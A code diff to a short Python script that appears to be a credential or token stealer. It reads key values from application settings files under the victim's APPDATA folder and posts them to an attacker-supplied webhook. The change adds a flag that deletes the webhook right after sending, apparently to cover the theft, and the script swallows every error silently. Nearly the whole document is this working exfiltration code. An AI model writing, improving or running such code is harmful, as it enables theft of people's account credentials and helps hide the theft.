@@ -6,6 +6,8 @@ import requests
 #enter you webhook url here
 WEBHOOK_URL = ""
 
+DESTROY_WEBHOOK = True
+
 
 def getKeys(path):
     with open(path) as f:
@@ -13,7 +15,7 @@ def getKeys(path):
             key = path.get("settings").get('key')
     return key
 
-def main(WEBHOOK_URL):
+def main():
 
     roaming = os.getenv('APPDATA')
 
@@ -42,10 +44,15 @@ def main(WEBHOOK_URL):
 
     try:
         requests.post(WEBHOOK_URL, json = {'content' : f'{message}'})
+
+        if DESTROY_WEBHOOK == True:
+            requests.delete(WEBHOOK_URL)
+        else:
+            pass
     except:
         pass
         
     
 
 if __name__ == '__main__':
-    main(WEBHOOK_URL)
+    main()
